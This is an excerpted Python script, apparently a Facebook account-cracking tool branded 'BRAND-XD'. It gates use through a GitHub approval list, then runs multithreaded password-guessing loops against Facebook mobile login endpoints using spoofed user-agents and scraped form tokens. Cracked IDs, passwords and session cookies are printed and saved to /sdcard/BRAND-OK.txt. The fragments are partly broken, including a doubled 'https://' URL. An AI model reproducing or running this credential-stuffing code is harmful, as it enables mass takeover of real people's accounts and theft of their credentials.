...
\033[97;1m>>     Version  :  \33[1;91m 0.0.2
...
\033[91;1m--------------------------------------------------""")
  ...
  try:
    httpCaht = requests.get(f"https://github.com/Tonu-143/FILE-XD/blob/main/approval.txt").text
    if id in httpCaht:
...
def ckx():
	uuid = str(os.geteuid()) + str(os.getlogin())
	id = "→".join(uuid)
	server = requests.get(f'https://github.com/Tonu-143/FILE-XD/blob/main/approval.txt').text
	try:
		httpCaht = requests.get(f"https://github.com/Tonu-143/FILE-XD/blob/main/approval.txt").text
		if id in httpCaht:
			msg = str(os.geteuid())
...
def Hasan():
	...
	if me in ["1", "01","11","A","a"]:
		os.system('xdg-open https://www.facebook.com/groups/672751520627850/?ref=share/')
		clear()
		file = input(f' \033[1;91m[\033[1;97m•\033[1;91m]\033[1;32m FINE NAME\033[1;94m: ')
		print(f" \033[1;93m××××××××××××××××××××××××××××××××××××××××××××××××")
		try:
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write(f'\r\r \033[1;37m [BRAND-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        complete = session.post(f'https://m.facebook.com/profile.php?eav=AfYnoi7QNKC7uZ1IhOGsCu3fThdCfhkiD6mu2rB3LPElONTUZ0egjvlcLJ9OG9AQ1uQ&paipv=0',data=idpass,allow_redirects=False,headers=head)
                        Shahin=session.cookies.get_dict().keys()
                        if "c_user" in Shahin:
                                coki=session.cookies.get_dict()
                                kuki = (f";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print(f'\r\r\033[1;32m [BRAND-OK] %s | %s'%(ids,pas))
                                open(f'/sdcard/BRAND-OK.txt', 'a').write(ids+'|'+pas+'\n')
...
def ffb3(ids,names,passlist):
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        ua=random.choice(ugen)
                        head = {'Host': 'x.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"Android"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
                        getlog = session.get(f'https://https://m.facebook.com/profile.php?eav=AfYnoi7QNKC7uZ1IhOGsCu3fThdCfhkiD6mu2rB3LPElONTUZ0egjvlcLJ9OG9AQ1uQ&paipv=0')
                        idpass ={"lsd":re.search(f'name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search(f'name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
                        complete = session.post(f'https://m.facebook.com/profile.php?eav=AfYnoi7QNKC7uZ1IhOGsCu3fThdCfhkiD6mu2rB3LPElONTUZ0egjvlcLJ9OG9AQ1uQ&paipv=0',data=idpass,allow_redirects=False,headers=head)
                        Shahin=session.cookies.get_dict().keys()
                        if "c_user" in Shahin:
...
def api(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print(f'\r\r\033[1;32m [BRAND-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open(f'/sdcard/BRAND-OK.txt','a').write(ids+'|'+pas+'\n')
                                        #cek_apk(session,coki)
                                        oks.append(ids)
                                        break
...
def bd():
                ...
                with tred(max_workers=30) as sat:     
                        ...
                        print(f' \033[1;91m[\033[1;97m•\033[1;91m]\033[1;32m Random Testing Version...')
                        print(f' \033[1;91m[\033[1;97m•\033[1;91m]\033[1;32m Prosess started\033[1;97m')
                        print(f" \033[1;91m[\033[1;97m•\033[1;91m]\033[1;32m Enjoy Data+Wifi \033[1;94m")
                        linex()
                        for psx in user:
                                ids = code+psx
...
def rcrack_free(idf,pwv):
	...
	#		print(idf+'|'+ps)
			#session = requests.Session()
			sys.stdout.write(f'\r\r\033[1;37m [BRAND-VIP] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
			session = requests.Session()
			...
			'user-agent':'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5 Mozilla/5.0 (Linux; Android 10; V2020A; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/13.8.0.0 Mozilla/5.0 (Linux; Android 10; XIAOMI Redmi Note 9 Pro Build/NMF26F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36 AlohaBrowser/2.19.3'}
			lo = session.post('https://m.facebook.com/profile.php?eav=AfYnoi7QNKC7uZ1IhOGsCu3fThdCfhkiD6mu2rB3LPElONTUZ0egjvlcLJ9OG9AQ1uQ&paipv=0',data=log_data,headers=header_freefb).text
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[151:166]
				print('\n')
				print('\033[1;92m[BRAND-OK] '+idf+' | '+ps+'\033[0;97m')
				cek_apk(coki)
				...
				cid = coki[141:156]
				print('\n')
				print('\033[1;91m[BRAND-CP] '+idf+' | '+ps+'\033[0;97m')
